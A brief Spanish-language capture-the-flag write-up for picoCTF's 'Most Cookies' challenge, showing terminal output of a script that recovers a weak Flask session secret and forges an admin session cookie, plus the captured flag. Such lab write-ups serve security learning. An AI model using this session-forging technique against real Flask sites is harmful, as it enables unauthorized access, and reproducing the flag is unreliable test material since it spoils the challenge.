# Most Cookies

## Objetivo
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/1e4bd835ad3e7fe776d49e7b8cc280c1/server.py) [http://mercury.picoctf.net:35697/](http://mercury.picoctf.net:35697/)

## Pistas

## Solucion
```
┌──(mi_entorno)─(kali㉿kali)-[~/Documents/web]
└─$ python3 solve.py eyJ2ZXJ5X2F1dGgiOiJwZWFudXQgYnV0dGVyIn0.Z0n9HA.SuiZm0lZd82TVcRN95-0oGkHkM0
Secret key: peanut butter
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z0n-7Q.ltjzV65QNdtwF5jKCm7OHUp2bWI
                                                                       
┌──(mi_entorno)─(kali㉿kali)-[~/Documents/web]
└─$ python3 solve.py eyJ2ZXJ5X2F1dGgiOiJwZWFudXQgYnV0dGVyIn0.Z0n9HA.SuiZm0lZd82TVcRN95-0oGkHkM0
Secret key: peanut butter
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z0oBMA.Y6gD3xAyaDGMlEjsBrVdXwXzdko
                                                                       
┌──(mi_entorno)─(kali㉿kali)-[~/Documents/web]
└─$ 

```
Cambiamos la cookie en la pagina, recargamos y aparecera la bandera
`picoCTF{pwn_4ll_th3_cook1E5_22fe0842}`

## Notas adicionales

## Referencias